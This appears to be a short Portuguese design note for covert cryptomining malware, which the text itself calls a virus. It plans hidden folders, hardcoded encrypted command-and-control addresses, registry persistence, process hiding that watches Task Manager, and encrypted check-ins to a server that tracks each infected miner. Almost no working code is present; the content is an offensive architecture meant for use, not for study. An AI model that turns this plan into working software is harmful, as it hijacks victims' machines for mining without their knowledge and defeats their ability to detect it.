# CryptoMining


Premissas:
* vários mineradores 
* usar menor quantidade de biblioteca possível 
* utilizar criptografia para assegurar segurança 
* Criar diretorio escondido e protegido com dados criptografados sobre o BTC 


**cgminer** pool name 

Hardcoded encrypted :server e porta e pool de conexão criptogtafados 

Pegar ID do Minerador e enviar pro Server, dizendo que ele está trabalhando 

Novos mineradores enviam pro Server dizendo que é novo 

Criar pasta oculta pro vírus com os dados do Mineiro e pool 

Toda comunicação entre servidor e mineiro é criptografada RSA 

Criar entrada no registro para minerar p sempre, mesmo com o desligamento da maquina (persistência)

Thread p checar task Manager 
Maquina mineira não pode descobrir que o processo está rodando, process hiding 

global bool lock_taskmanager = false; 
while(!lock_taskmanager){
     Check 
}
continue mining 

Malware + cgminer 

1 processo pai para comunicar com o Server e checar taskmanager , spawna um processo filho cgminer p minerar 

Troca de dados entre cliente e servidor via protocolo http, json encryptado 

Mineiro avisa de 5 em 5 minutos pro Server que esta minerando 

**servidor**

Multithreaded Http server que concorda na troca de chave de criptografia com o cliente 

Recebe os dados do cliente : id do mineiro 

Cria pasta no servidor para cada mineiro com dados de quanto tempo ficou minerando 